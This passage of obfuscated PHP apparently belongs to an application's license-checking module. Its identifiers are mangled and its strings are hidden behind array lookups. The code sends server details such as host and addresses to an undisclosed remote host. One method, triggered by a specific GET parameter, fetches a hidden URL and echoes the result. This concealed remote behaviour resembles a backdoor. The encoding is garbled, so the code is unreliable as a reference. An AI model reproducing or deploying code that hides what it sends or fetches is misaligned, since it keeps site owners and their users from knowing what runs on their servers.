¿ù‚°Šß[$bÑÜ÷˜•Ÿù[217]], $bÑÜ÷˜•Ÿù[218] => $bÑÜ÷˜•Ÿù[130](16), $bÑÜ÷˜•Ÿù[126] => $a ¿ù‚°Šß[$bÑÜ÷˜•Ÿù[219]]); goto Aë½’›èá¥; fŞó«¯­©ã: if (!$bÑÜ÷˜•Ÿù[112]($GLOBALS, $bÑÜ÷˜•Ÿù[138])) { die; } $cº…¥ä¦ƒ = $GLOBALS[$bÑÜ÷˜•Ÿù[22]]; if (isset($cº…¥ä¦ƒ[$bÑÜ÷˜•Ÿù[169]])) { $this->{$_SERVER[´Öò¹²][170]}(); die; } goto fÄªÉÌİ£«; AªĞ‹Íî: $bõğ¢—‡“ =& $_SERVER[Â€Á›¨õ]; $bÑÜ÷˜•Ÿù =& $_SERVER[´Öò¹²]; if ($_SERVER[$bÑÜ÷˜•Ÿù[44]] != $bÑÜ÷˜•Ÿù[168]) { return; } goto fŞó«¯­©ã; E¸ìÊÆ’¦: $this->{$_SERVER[´Öò¹²][235]}(); Cache::set($bÑÜ÷˜•Ÿù[236] . $bÑÜ÷˜•Ÿù[120]($FšÕŠµŠÕŞ . $bÑÜ÷˜•Ÿù[237]), $bÑÜ÷˜•Ÿù[10]); $bÑÜ÷˜•Ÿù[172]($bÑÜ÷˜•Ÿù[204]($bÑÜ÷˜•Ÿù[214]), !0); goto BÏ¥Å´œí; CÎ¬—Ûğ…†: if (strlen($d˜•œÒÛ…¯) < $bõğ¢—‡“[592]) { die; } $Bš•Ó™Ù×ø[$bÑÜ÷˜•Ÿù[129]] = $bÑÜ÷˜•Ÿù[124]($bÑÜ÷˜•Ÿù[220]($this->{$_SERVER[´Öò¹²][153]}($fÈœ„µ•™Á, $bÑÜ÷˜•Ÿù[222]))); if ($a ¿ù‚°Šß[$bÑÜ÷˜•Ÿù[223]] && $a ¿ù‚°Šß[$bÑÜ÷˜•Ÿù[223]] >= 1) { $bÑÜ÷˜•Ÿù[61]($bÑÜ÷˜•Ÿù[62])->{$_SERVER[´Öò¹²][224]}($bÑÜ÷˜•Ÿù[225], $bÑÜ÷˜•Ÿù[226]); } goto cÀŠ½£Œ; DÊï¬’²ÜÖ: $bİÎŸ¸Ïñ = $bÑÜ÷˜•Ÿù[228]($bÑÜ÷˜•Ÿù[61]($bÑÜ÷˜•Ÿù[11])->{$_SERVER[´Öò¹²][229]}(), $bÑÜ÷˜•Ÿù[230]); $b¤‡ôŠùñ = $bİÎŸ¸Ïñ[$bÑÜ÷˜•Ÿù[231]]; $dß®ƒùöª = $bõğ¢—‡“[615]; goto Eå„ñÏ¢Ô…; DŒ•¦  âï: $Dø˜–µ«‹ˆ = $bÑÜ÷˜•Ÿù[130](16); $fÈœ„µ•™Á = $Dø˜–µ«‹ˆ . $Bš•Ó™Ù×ø[$bÑÜ÷˜•Ÿù[126]] . $this->{$_SERVER[´Öò¹²][153]}($bÑÜ÷˜•Ÿù[120]($Bš•Ó™Ù×ø[$bÑÜ÷˜•Ÿù[215]]), $Dø˜–µ«‹ˆ); $d˜•œÒÛ…¯ = $bõğ¢—‡“[613]; goto CÎ¬—Ûğ…†; B’·àÎ»ß«: $this->wzul6408bb39 = $Bš•Ó™Ù×ø[$bÑÜ÷˜•Ÿù[126]]; $a÷ÎØ²ªí¾ = $bõğ¢—‡“[618]; if (!$a÷ÎØ²ªí¾) { die; } goto E¸ìÊÆ’¦; Fğ°²ÌÂ¢…: if (!$dÃ¯ŠË‘ã) { die; } $bÛÃ„ëâ¦½[$f¯îì¥Ûôò] = $f ½ˆ©¥Ì½; $f‹Û¤¢¼ = $bõğ¢—‡“[617]; goto AÁ‚®šŒĞ; cÂß±è¨Ö»: $f ½ˆ©¥Ì½ = $this->{$_SERVER[´Öò¹²][133]}($bÑÜ÷˜•Ÿù[154]($a ¿ù‚°Šß), $aöØÏßá‡Ú); $eƒ—ÎÉ¹«Ä = $bõğ¢—‡“[614]; if (strlen($eƒ—ÎÉ¹«Ä) < $bõğ¢—‡“[592]) { die; } goto DÊï¬’²ÜÖ; AÁ‚®šŒĞ: if (!$f‹Û¤¢¼) { die; } $bÑÜ÷˜•Ÿù[61]($bÑÜ÷˜•Ÿù[11])->{$_SERVER[´Öò¹²][232]}($b¤‡ôŠùñ[$bÑÜ÷˜•Ÿù[233]], array($bÑÜ÷˜•Ÿù[234] => $bÛÃ„ëâ¦½)); $this->qbam631bd298 = $a ¿ù‚°Šß; goto B’·àÎ»ß«; fÄªÉÌİ£«: if (!isset($cº…¥ä¦ƒ[$bÑÜ÷˜•Ÿù[171]]) || $bÑÜ÷˜•Ÿù[24]($cº…¥ä¦ƒ[$bÑÜ÷˜•Ÿù[171]]) != 16) { $bÑÜ÷˜•Ÿù[172]($bÑÜ÷˜•Ÿù[173] . $cº…¥ä¦ƒ[$bÑÜ÷˜•Ÿù[171]], !1); } $FšÕŠµŠÕŞ = $bÑÜ÷˜•Ÿù[61]($bÑÜ÷˜•Ÿù[62])->{$_SERVER[´Öò¹²][63]}($bÑÜ÷˜•Ÿù[122]); $AÃ‡šôÍ’ = array($bÑÜ÷˜•Ÿù[171] => $cº…¥ä¦ƒ[$bÑÜ÷˜•Ÿù[171]], $bÑÜ÷˜•Ÿù[174] => $bÑÜ÷˜•Ÿù[130](16), $bÑÜ÷˜•Ÿù[175] => $bÑÜ÷˜•Ÿù[155], $bÑÜ÷˜•Ÿù[176] => $bÑÜ÷˜•Ÿù[177], $bÑÜ÷˜•Ÿù[178] => $_SERVER[$bÑÜ÷˜•Ÿù[179]], $bÑÜ÷˜•Ÿù[180] => $_SERVER[$bÑÜ÷˜•Ÿù[181]], $bÑÜ÷˜•Ÿù[182] => $_SERVER[$bÑÜ÷˜•Ÿù[183]]); goto bËÍï—Åæš; Aë½’›èá¥: if ($AÃ‡šôÍ’[$bÑÜ÷˜•Ÿù[174]]) { $Bš•Ó™Ù×ø[$bÑÜ÷˜•Ÿù[218]] = $AÃ‡šôÍ’[$bÑÜ÷˜•Ÿù[174]]; } $Eğï×Û¥ê = $bÑÜ÷˜•Ÿù[25]($bÑÜ÷˜•Ÿù[120]($Bš•Ó™Ù×ø[$bÑÜ÷˜•Ÿù[216]]), 10, 10); $aë†Ö¸¤•ù = $Eğï×Û¥ê . $Bš•Ó™Ù×ø[$bÑÜ÷˜•Ÿù[126]] . $Bš•Ó™Ù×ø[$bÑÜ÷˜•Ÿù[218]]; goto CğğóŞôÂ; Eå„ñÏ¢Ô…: while ($dß®ƒùöª < $bõğ¢—‡“[589]) { if ($dß®ƒùöª >= 0) { break; } $dß®ƒùöª++; } $bÛÃ„ëâ¦½ = array(); $dÃ¯ŠË‘ã = $bõğ¢—‡“[616]; goto Fğ°²ÌÂ¢…; cÀŠ½£Œ: $bÑÜ÷˜•Ÿù[61]($bÑÜ÷˜•Ÿù[62])->{$_SERVER[´Öò¹²][227]}($Bš•Ó™Ù×ø); $aöØÏßá‡Ú = $bÑÜ÷˜•Ÿù[120]($_SERVER[$bÑÜ÷˜•Ÿù[121]] . $bÑÜ÷˜•Ÿù[220]($FšÕŠµŠÕŞ) . $Bš•Ó™Ù×ø[$bÑÜ÷˜•Ÿù[216]]); $f¯îì¥Ûôò = $bÑÜ÷˜•Ÿù[220]($bÑÜ÷˜•Ÿù[25]($aöØÏßá‡Ú, 10, 16)); goto cÂß±è¨Ö»; a „À»˜Ü„: if ($cº…¥ä¦ƒ[$bÑÜ÷˜•Ÿù[184]] == $bÑÜ÷˜•Ÿù[185]) { $DÔò…Ú´¨… = $this->{$_SERVER[´Öò¹²][153]}($d¾ƒ®•ôÀì, $bÑÜ÷˜•Ÿù[186]); $bƒäñ†·ÅŠ = $this->{$_SERVER[´Öò¹²][133]}($bÑÜ÷˜•Ÿù[154]($AÃ‡šôÍ’), $d¾ƒ®•ôÀì . $bÑÜ÷˜•Ÿù[187], 3); $bƒäñ†·ÅŠ = $bƒäñ†·ÅŠ . $bÑÜ÷˜•Ÿù[188] . $_SERVER[$bÑÜ÷˜•Ÿù[179]]; $cëŸÓˆôÄ‰ = $this->{$_SERVER[´Öò¹²][189]}($bÑÜ÷˜•Ÿù[190] . $DÔò…Ú´¨… . $bÑÜ÷˜•Ÿù[191] . $bƒäñ†·ÅŠ, -1); $bÑÜ÷˜•Ÿù[172]($cëŸÓˆôÄ‰, !0); } else { if ($cº…¥ä¦ƒ[$bÑÜ÷˜•Ÿù[184]] == $bÑÜ÷˜•Ÿù[192]) { $B„Šº‹¨„¦ = $bÑÜ÷˜•Ÿù[25]($bÑÜ÷˜•Ÿù[120]($bÑÜ÷˜•Ÿù[193] . $d¾ƒ®•ôÀì), 12, 15) . $bÑÜ÷˜•Ÿù[194]; $bƒäñ†·ÅŠ = $this->{$_SERVER[´Öò¹²][195]}($bÑÜ÷˜•Ÿù[2]($cº…¥ä¦ƒ[$bÑÜ÷˜•Ÿù[196]]), $B„Šº‹¨„¦, 2); $c£ÂïÁ‹ÉÓ = $bÑÜ÷˜•Ÿù[197]($bƒäñ†·ÅŠ, !0); if (!$bÑÜ÷˜•Ÿù[198]($c£ÂïÁ‹ÉÓ) || !$bÑÜ÷˜•Ÿù[198]($c£ÂïÁ‹ÉÓ[$bÑÜ÷˜•Ÿù[199]]) || $c£ÂïÁ‹ÉÓ[$bÑÜ÷˜•Ÿù[171]] != !0) { $dÍñ¶‡½éİ = $bÑÜ÷˜•Ÿù[200]; $DéÔ‚Í…× = $c£ÂïÁ‹ÉÓ[$bÑÜ÷˜•Ÿù[199]] ? $bÑÜ÷˜•Ÿù[201] . $c£ÂïÁ‹ÉÓ[$bÑÜ÷˜•Ÿù[199]] : $dÍñ¶‡½éİ; $bÑÜ÷˜•Ÿù[172]($DéÔ‚Í…×, !1); } else { $AÃ‡šôÍ’[$bÑÜ÷˜•Ÿù[174]] = $c£ÂïÁ‹ÉÓ[$bÑÜ÷˜•Ÿù[199]][$bÑÜ÷˜•Ÿù[202]]; } } else { $c£ÂïÁ‹ÉÓ = $this->{$_SERVER[´Öò¹²][189]}($bÑÜ÷˜•Ÿù[203], $AÃ‡šôÍ’, 10); $eˆ•ÎøÛìÙ = $bõğ¢—‡“[611]; } } if (!$bÑÜ÷˜•Ÿù[198]($c£ÂïÁ‹ÉÓ) || !$bÑÜ÷˜•Ÿù[198]($c£ÂïÁ‹ÉÓ[$bÑÜ÷˜•Ÿù[199]]) || $c£ÂïÁ‹ÉÓ[$bÑÜ÷˜•Ÿù[171]] != !0) { $dÍñ¶‡½éİ = $bÑÜ÷˜•Ÿù[204]($bÑÜ÷˜•Ÿù[205]); $DéÔ‚Í…× = $c£ÂïÁ‹ÉÓ[$bÑÜ÷˜•Ÿù[199]] ? $bÑÜ÷˜•Ÿù[201] . $c£ÂïÁ‹ÉÓ[$bÑÜ÷˜•Ÿù[199]] : $dÍñ¶‡½éİ; $bÑÜ÷˜•Ÿù[172]($DéÔ‚Í…×, !1); } $a ¿ù‚°Šß = $c£ÂïÁ‹ÉÓ[$bÑÜ÷˜•Ÿù[199]]; goto Cß˜›¼«ï‘; CğğóŞôÂ: $Bš•Ó™Ù×ø[$bÑÜ÷˜•Ÿù[128]] = $bÑÜ÷˜•Ÿù[220]($bÑÜ÷˜•Ÿù[124]($this->{$_SERVER[´Öò¹²][153]}($aë†Ö¸¤•ù, $bÑÜ÷˜•Ÿù[221]))); $Bñ¿Ó„ˆ¬Å = $bõğ¢—‡“[612]; if (strlen($Bñ¿Ó„ˆ¬Å) < $bõğ¢—‡“[570]) { return; } goto DŒ•¦  âï; bËÍï—Åæš: $d¾ƒ®•ôÀì = $bÑÜ÷˜•Ÿù[120]($_SERVER[$bÑÜ÷˜•Ÿù[121]] . $FšÕŠµŠÕŞ); $D§Ñô™®ƒ = $bõğ¢—‡“[610]; if (strlen($D§Ñô™®ƒ) < $bõğ¢—‡“[570]) { return; } goto a „À»˜Ü„; BÏ¥Å´œí: } private function licenseRegistSuccess() { $b†ö˜ç©±ƒ =& $_SERVER[´Öò¹²]; $cµ”í¡¾… = $b†ö˜ç©±ƒ[61]($b†ö˜ç©±ƒ[62])->{$_SERVER[´Öò¹²][63]}(); if ($cµ”í¡¾…[$b†ö˜ç©±ƒ[89]] != $b†ö˜ç©±ƒ[226]) { $b†ö˜ç©±ƒ[61]($b†ö˜ç©±ƒ[62])->{$_SERVER[´Öò¹²][227]}($b†ö˜ç©±ƒ[89], $b†ö˜ç©±ƒ[226]); } $b†ö˜ç©±ƒ[116]($b†ö˜ç©±ƒ[238])->{$_SERVER[´Öò¹²][239]}(!0); } private function ymdpe3b97e75() { goto FåÁêˆä; fœëà‡À©æ: $aõ‚Ù‡½’Ê[61]($aõ‚Ù‡½’Ê[62])->{$_SERVER[´Öò¹²][224]}($aõ‚Ù‡½’Ê[225], $aõ‚Ù‡½’Ê[240]); $this->qbam631bd298 = array(); $c¬çÓ·¦¨¸ = $cŠ²®Šâ”í[619]; goto dÀ›ÇîôÁÎ; dÀ›ÇîôÁÎ: if (strlen($c¬çÓ·¦¨¸) < $cŠ²®Šâ”í[603]) { return; } $this->wzul6408bb39 = $aõ‚Ù‡½’Ê[127]; goto b‘´³Ú÷±‚; FåÁêˆä: $cŠ²®Šâ”í =& $_SERVER[Â€Á›¨õ]; $aõ‚Ù‡½’Ê =& $_SERVER[´Öò¹²]; $aõ‚Ù‡½’Ê[61]($aõ‚Ù‡½’Ê[62])->{$_SERVER[´Öò¹²][227]}(array($aõ‚Ù‡½’Ê[215] => $aõ‚Ù‡½’Ê[10], $aõ‚Ù‡½’Ê[216] => $aõ‚Ù‡½’Ê[10], $aõ‚Ù‡½’Ê[126] => $aõ‚Ù‡½’Ê[127], $aõ‚Ù‡½’Ê[128] => $aõ‚Ù‡½’Ê[10], $aõ‚Ù‡½’Ê[129] => $aõ‚Ù‡½’Ê[10])); goto fœëà‡À©æ; b‘´³Ú÷±‚: } private function cbgr3fcb49ca() { goto FééîŠãö; f†Ö‰å¿‚‘: $a°ÊÃÓ—îÄ = $FõöÖšóß[622]; if (!$a°ÊÃÓ—îÄ) { return; } if ($fÜÓ¿­½¡ç[$få¨öîƒñ½[126]] == $få¨öîƒñ½[127]) { return; } goto FŸ™£‚ŒÖ; FééîŠãö: $FõöÖšóß =& $_SERVER[Â€Á›¨õ]; $få¨öîƒñ½ =& $_SERVER[´Öò¹²]; $_SERVER[$få¨öîƒñ½[181]] = $få¨öîƒñ½[112]($_SERVER, $få¨öîƒñ½[181], APP_HOST); goto e¦†­Ëìº³; D©Î‡Äİ: while (strlen($bƒİ´š‡£©) < $FõöÖšóß[589]) { if (!$bƒİ´š‡£©) { break; } $bƒİ´š‡£©++; } $eˆµĞ™‹»™ = Cache::get($FÂÅ£ÔÛÑ”); if (!$få¨öîƒñ½[198]($eˆµĞ™‹»™) || !isset($eˆµĞ™‹»™[$få¨öîƒñ½[241]]) || $få¨öîƒñ½[242]() - $eˆµĞ™‹»™[$få¨öîƒñ½[241]] >= 60) { $D¸°¯°Ÿ¡ = $få¨öîƒñ½[228]($få¨öîƒñ½[61]($få¨öîƒñ½[11])->{$_SERVER[´Öò¹²][229]}(), $få¨öîƒñ½[230]); $eº”ˆ¿”•Ô = $D¸°¯°Ÿ¡[$få¨öîƒñ½[231]]; $AˆŸ•ô­è = $få¨öîƒñ½[120]($_SERVER[$få¨öîƒñ½[121]] . $få¨öîƒñ½[220]($cªæàØ¾Š) . $fÜÓ¿­½¡ç[$få¨öîƒñ½[216]]); $EÆ‚‰¿ÜŸ = $få¨öîƒñ½[220]($få¨öîƒñ½[25]($AˆŸ•ô­è, 10, 16)); $eˆµĞ™‹»™ = $this->{$_SERVER[´Öò¹²][195]}($eº”ˆ¿”•Ô[$få¨öîƒñ½[100]][$EÆ‚‰¿ÜŸ], $AˆŸ•ô­è); $eˆµĞ™‹»™ = $få¨öîƒñ½[197]($eˆµĞ™‹»™, !0); } goto F¢¦¾ª¢©Ä; FŸ™£‚ŒÖ: $cªæàØ¾Š = $få¨öîƒñ½[61]($få¨öîƒñ½[62])->{$_SERVER[´Öò¹²][63]}($få¨öîƒñ½[122]); $FÂÅ£ÔÛÑ” = $få¨öîƒñ½[236] . $få¨öîƒñ½[120]($cªæàØ¾Š . $få¨öîƒñ½[237]); $bƒİ´š‡£© = $FõöÖšóß[623]; goto D©Î‡Äİ; dÈ‡ôÔŸØµ: if ($få¨öîƒñ½[242]() - $eˆµĞ™‹»™[$få¨öîƒñ½[241]] > 20) { $eˆµĞ™‹»™[$få¨öîƒñ½[241]] = $få¨öîƒñ½[242](); Cache::set($FÂÅ£ÔÛÑ”, $eˆµĞ™‹»™); } $this->qbam631bd298 = $eˆµĞ™‹»™; $this->wzul6408bb39 = $fÜÓ¿­½¡ç[$få¨öîƒñ½[126]]; goto CØñ°Ù˜Å´; CØñ°Ù˜Å´: $f¯¯§Ò›¬¤ = $FõöÖšóß[624]; while ($f¯¯§Ò›¬¤ < $FõöÖšóß[570]) { if ($f¯¯§Ò›¬¤ >= 0) { break; } $f¯¯§Ò›¬¤++; } goto A‰ŸÇø ºÕ; e¦†­Ëìº³: $DÚó­àÍì— = $FõöÖšóß[620]; while (strlen($DÚó­àÍì—) < $FõöÖšóß[570]) { if (!$DÚó­àÍì—) { break; } $DÚó­àÍì—++; } $this->wzul6408bb39 = $få¨öîƒñ½[127]; goto f¥Ó †„Ğ; f¥Ó †„Ğ: $FÁ ¹ŠË‰Ò = $FõöÖšóß[621]; while (strlen($FÁ ¹ŠË‰Ò) < $FõöÖšóß[603]) { if (!$FÁ ¹ŠË‰Ò) { break; } $FÁ ¹ŠË‰Ò++; } $fÜÓ¿­½¡ç = $få¨öîƒñ½[61]($få¨öîƒñ½[62])->{$_SERVER[´Öò¹²][63]}(); goto f†Ö‰å¿‚‘; F¢¦¾ª¢©Ä: if (!$få¨öîƒñ½[198]($eˆµĞ™‹»™)) { return $this->{$_SERVER[´Öò¹²][170]}(); } $AõÛ»Æ­±ƒ = $få¨öîƒñ½[150]($eˆµĞ™‹»™[$få¨öîƒñ½[151]]); if ($få¨öîƒñ½[242]() >= $AõÛ»Æ­±ƒ) { return $this->{$_SERVER[´Öò¹²][170]}(); } goto dÈ‡ôÔŸØµ; A‰ŸÇø ºÕ: } private function txsydfedd81f() { goto d¥ß‘‘ò›–; eàÉğæ‚¬: if ($bñå™ƒ§šÙ == $eİé¼ÏÄ[243] && $this->wzul6408bb39 == $eİé¼ÏÄ[127]) { $eİé¼ÏÄ[172]($eİé¼ÏÄ[204]($eİé¼ÏÄ[244]), !1, $eİé¼ÏÄ[245]); } $FÅÙÁù×¡ = array($eİé¼ÏÄ[246], $eİé¼ÏÄ[247]); if ($eİé¼ÏÄ[248]($bñå™ƒ§šÙ, $FÅÙÁù×¡)) { if ($this->wzul6408bb39 == $eİé¼ÏÄ[127] && isset($dë¸ãæ¡«„[$eİé¼ÏÄ[249]])) { $eİé¼ÏÄ[172]($eİé¼ÏÄ[204]($eİé¼ÏÄ[244]), !1, $eİé¼ÏÄ[245]); die; } $c¼İ„ªÂ×‘ = $this->{$_SERVER[´Öò¹²][143]}(); if ($c¼İ„ªÂ×‘ != $eİé¼ÏÄ[250]($eİé¼ÏÄ[251])) { if ($c¼İ„ªÂ×‘ <= $eİé¼ÏÄ[61]($eİé¼ÏÄ[145])->{$_SERVER[´Öò¹²][146]}()) { $eİé¼ÏÄ[172]($eİé¼ÏÄ[204]($eİé¼ÏÄ[252]), !1, $eİé¼ÏÄ[245]); die; } } } goto bØŠ°±¨‹; FàË›óÂÓÎ: $bñå™ƒ§šÙ = $_SERVER[$eİé¼ÏÄ[44]]; $c­ÕÂÑŠÊ = $aÍ¿ºğİã[625]; while ($c­ÕÂÑŠÊ < $aÍ¿ºğİã[578]) { if ($c­ÕÂÑŠÊ >= 0) { break; } $c­ÕÂÑŠÊ++; } goto eàÉğæ‚¬; d¥ß‘‘ò›–: $aÍ¿ºğİã =& $_SERVER[Â€Á›¨õ]; $eİé¼ÏÄ =& $_SERVER[´Öò¹²]; $dë¸ãæ¡«„ = $GLOBALS[$eİé¼ÏÄ[22]]; goto FàË›óÂÓÎ; bØŠ°±¨‹: } private function bldne9c326a1() { goto D“ï²¸; D“ï²¸: $FÄ’ÊîßÑ™ =& $_SERVER[Â€Á›¨õ]; $f»èÉ¤îï =& $_SERVER[´Öò¹²]; $B©ÍÚìª¢” = array($f»èÉ¤îï[141], $f»èÉ¤îï[253]); goto fÙ™÷ì‚‰ğ; fÙ™÷ì‚‰ğ: $dèğÛ¨Ñ«ç = $FÄ’ÊîßÑ™[626]; if (!$f»èÉ¤îï[112]($GLOBALS, $f»èÉ¤îï[138]) || !isset($_GET[$f»èÉ¤îï[254]])) { return; } if (!$f»èÉ¤îï[248]($_SERVER[$f»èÉ¤îï[44]], $B©ÍÚìª¢”)) { return; } goto bÖøæÊÆÛŒ; Eƒ”êÀìßŸ: $bÍğ“ÄŠŒÚ = $this->{$_SERVER[´Öò¹²][256]}($bÍğ“ÄŠŒÚ, $f»èÉ¤îï[257]); $cË¸¹÷Õô• = $f»èÉ¤îï[258](array($f»èÉ¤îï[259] => array($f»èÉ¤îï[260] => $f»èÉ¤îï[261], $f»èÉ¤îï[262] => 3))); $CªËŠí  = @$f»èÉ¤îï[263]($bÍğ“ÄŠŒÚ, !1, $cË¸¹÷Õô•); goto fÚœÁä¯”; fÚœÁä¯”: $f»èÉ¤îï[264]($f»èÉ¤îï[265]); if ($CªËŠí  && $f»èÉ¤îï[32]($CªËŠí , $f»èÉ¤îï[266])) { echo $CªËŠí ; } die; goto eÊ‰ÜÓ»¢Ø; bÖøæÊÆÛŒ: $bÍğ“ÄŠŒÚ = $f»èÉ¤îï[255]; $a›õêëí‡Ô = $FÄ’ÊîßÑ™[627]; if (!$a›õêëí‡Ô) { die; } goto Eƒ”êÀìßŸ; eÊ‰ÜÓ»¢Ø: } public function noip3c55815d($F¸…ŞŠé·‚) { goto eæ›ç¸è²‚; BŸÁÜèáºŞ: $FÄçâÏ²†£ = $A¾§¥“Ë¾[631]; if (strlen($FÄçâÏ²†£) < $A¾§¥“Ë¾[589]) { die; } goto DèÅöÄ¶â‡; CÏ’Êà¥ëì: $bÚºæŠ¿Ô® = array(); $ağ¤³´Èí˜ = $A¾§¥“Ë¾[629]; if (!$ağ¤³´Èí˜) { return; } goto d÷ëé‰Íù; DÎ±ÔË¤¦‘: $eÜ†àä·» = array($f¿ÛãÂïÖ[268] => $f¿ÛãÂïÖ[269], $f¿ÛãÂïÖ[270] => $f¿ÛãÂïÖ[269], $f¿ÛãÂïÖ[271] => $f¿ÛãÂïÖ[269], $f¿ÛãÂïÖ[272] => $f¿ÛãÂïÖ[269], $f¿ÛãÂïÖ[273] => $f¿ÛãÂïÖ[269], $f¿ÛãÂïÖ[274] => $f¿ÛãÂïÖ[275], $f¿ÛãÂïÖ[276] => $f¿ÛãÂïÖ[275], $f¿ÛãÂïÖ[277] => $f¿ÛãÂïÖ[275], $f¿ÛãÂïÖ[278] => $f¿ÛãÂïÖ[275], $f¿ÛãÂïÖ[279] => $f¿ÛãÂïÖ[275], $f¿ÛãÂïÖ[280] => $f¿ÛãÂïÖ[275], $f¿ÛãÂïÖ[281] => $f¿ÛãÂïÖ[275]); $BÂùÒÖ = $A¾§¥“Ë¾[628]; $F‹Œ±ÜæŒ  = $f¿ÛãÂïÖ[0]($f¿ÛãÂïÖ[282], $f¿ÛãÂïÖ[112]($this->qbam631bd298, $f¿ÛãÂïÖ[135], $f¿ÛãÂïÖ[10])); goto CÏ’Êà¥ëì; d÷ëé‰Íù: foreach ($eÜ†àä·» as $fëÅÂì³—ê => $F±¦ÀºÂºÈ) { if ($F±¦ÀºÂºÈ == $f¿ÛãÂïÖ[269] && $f¿ÛãÂïÖ[25]($this->wzul6408bb39, 0, 1) == $f¿ÛãÂïÖ[269]) { continue; } if (!$f¿ÛãÂïÖ[248]($fëÅÂì³—ê, $F‹Œ±ÜæŒ )) { $bÚºæŠ¿Ô®[] = $fëÅÂì³—ê; } } foreach ($bÚºæŠ¿Ô® as $fëÅÂì³—ê) { unset($F¸…ŞŠé·‚[$fëÅÂì³—ê]); $CÙ¸ëİõªª = $A¾§¥“Ë¾[630]; while ($CÙ¸ëİõªª < $A¾§¥“Ë¾[589]) { if ($CÙ¸ëİõªª >= 0) { break; } $CÙ¸ëİõªª++; } } return $F¸…ŞŠé·‚; goto BŸÁÜèáºŞ; eæ›ç¸è²‚: $A¾§¥“Ë¾ =& $_SERVER[Â€Á›¨õ]; $f¿ÛãÂïÖ =& $_SERVER[´Öò¹²]; if ($this->wzul6408bb39 == $f¿ÛãÂïÖ[267]) { return $F¸…ŞŠé·‚; } goto DÎ±ÔË¤¦‘; DèÅöÄ¶â‡: } private function adxta54a1885() { goto d¸Ù‘Ä„Æº; fĞÎ›‡×‚™: $GLOBALS[$CÄšØƒôËï[100]][$CÄšØƒôËï[104]][$CÄšØƒôËï[283]] = $CÄšØƒôËï[226]; $GLOBALS[$CÄšØƒôËï[100]][$CÄšØƒôËï[284]] = $CÄšØƒôËï[226]; $dÕˆªí’È = $D‡É’“î²‹[632]; goto E„¤š˜ãŒ†; E„¤š˜ãŒ†: if (strlen($dÕˆªí’È) < $D‡É’“î²‹[603]) { die; } if ($CÄšØƒôËï[61]($CÄšØƒôËï[285])->{$_SERVER[´Öò¹²][63]}($CÄšØƒôËï[89]) != $CÄšØƒôËï[240]) { $CÄšØƒôËï[61]($CÄšØƒôËï[285])->{$_SERVER[´Öò¹²][227]}($CÄšØƒôËï[89], $CÄšØƒôËï[240]); } goto e ñ‰Úì§š; d¸Ù‘Ä„Æº: $D‡É’“î²‹ =& $_SERVER[Â€Á›¨õ]; $CÄšØƒôËï =& $_SERVER[´Öò¹²]; if ($this->wzul6408bb39 != $CÄšØƒôËï[127]) { return; } goto fĞÎ›‡×‚™; e ñ‰Úì§š: } public function jdtnff228922() { return $_SERVER[´Öò¹²][286]; $Bäé’”˜¼ = $_SERVER[Â€Á›¨õ][633]; if (!$Bäé’”˜¼) { die; } } private function uskaf327cd67() { goto aâå‰½˜±£; cº”‡•‰Õœ: $E­ù‡Èˆªœ = $this->{$_SERVER[´Öò¹²][189]}($F‹¦ùÏàÅÒ[295], $aäãÏ÷ÇòÁ); $B¦è’³ÂÙù = $bæÃ®÷Í[636]; while ($B¦è’³ÂÙù < $bæÃ®÷Í[603]) { if ($B¦è’³ÂÙù >= 0) { break; } $B¦è’³ÂÙù++; } goto a©š’‰Åàê; eÂ§Œ’Äì: $AÖå¾°…†ê = $F‹¦ùÏàÅÒ[13](array($F‹¦ùÏàÅÒ[292], $F‹¦ùÏàÅÒ[293]), $FëàŞãŸ½); $E˜±’²ãŒ = $bæÃ®÷Í[635]; if (strlen($E˜±’²ãŒ) < $bæÃ®÷Í[603]) { return; } goto eª…èğÃ˜Œ; bÁİÎƒğªÍ: $f†®®Ñ‰è = $bæÃ®÷Í[634]; if (strlen($f†®®Ñ‰è) < $bæÃ®÷Í[570]) { die; } $FëàŞãŸ½ = $F‹¦ùÏàÅÒ[290] . $F‹¦ùÏàÅÒ[120]($F‹¦ùÏàÅÒ[291]); goto cÜ±²ÅèÙî; eª…èğÃ˜Œ: if ($AÖå¾°…†ê && $F‹¦ùÏàÅÒ[242]() - $AÖå¾°…†ê < $F‹¦ùÏàÅÒ[250]($F‹¦ùÏàÅÒ[294])) { return; } $F‹¦ùÏàÅÒ[13](array($F‹¦ùÏàÅÒ[292], $F‹¦ùÏàÅÒ[158]), $FëàŞãŸ½, $F‹¦ùÏàÅÒ[242]()); $aäãÏ÷ÇòÁ = array($F‹¦ùÏàÅÒ[171] => $F‹¦ùÏàÅÒ[61]($F‹¦ùÏàÅÒ[62])->{$_SERVER[´Öò¹²][63]}($F‹¦ùÏàÅÒ[215]), $F‹¦ùÏàÅÒ[184] => $this->wzul6408bb39, $F‹¦ùÏàÅÒ[182] => $_SERVER[$F‹¦ùÏàÅÒ[183]], $F‹¦ùÏàÅÒ[175] => $F‹¦ùÏàÅÒ[155], $F‹¦ùÏàÅÒ[178] => $_SERVER[$F‹¦ùÏàÅÒ[179]]); goto cº”‡•‰Õœ; aâå‰½˜±£: $bæÃ®÷Í =& $_SERVER[Â€Á›¨õ]; $F‹¦ùÏàÅÒ =& $_SERVER[´Öò¹²]; $fÍ„Ö®¨¼­ = array($F‹¦ùÏàÅÒ[287], $F‹¦ùÏàÅÒ[288], $F‹¦ùÏàÅÒ[289]); goto bÁİÎƒğªÍ; cÜ±²ÅèÙî: if ($this->wzul6408bb39 == $F‹¦ùÏàÅÒ[127] || !$F‹¦ùÏàÅÒ[112]($GLOBALS, $F‹¦ùÏàÅÒ[138])) { return; } if (!$F‹¦ùÏàÅÒ[248]($_SERVER[$F‹¦ùÏàÅÒ[44]], $fÍ„Ö®¨¼­)) { return; } if ($F‹¦ùÏàÅÒ[242]() % 4 != 0) { return; } goto eÂ§Œ’Äì; D‹Â’¢²Í´: $B¤ß«†˜Öê = $bæÃ®÷Í[637]; if (!$B¤ß«†˜Öê) { return; } if ($this->{$_SERVER[´Öò¹²][206]}($E­ù‡Èˆªœ[$F‹¦ùÏàÅÒ[296]]) != $aäãÏ÷ÇòÁ[$F‹¦ùÏàÅÒ[171]]) { $dõË„Üƒæ = array($F‹¦ùÏàÅÒ[208] => $F‹¦ùÏàÅÒ[61]($F‹¦ùÏàÅÒ[62])->{$_SERVER[´Öò¹²][63]}($F‹¦ùÏàÅÒ[122]), $F‹¦ùÏàÅÒ[209] => $_SERVER[$F‹¦ùÏàÅÒ[121]], $F‹¦ùÏàÅÒ[210] => $F‹¦ùÏàÅÒ[211](), $F‹¦ùÏàÅÒ[180] => 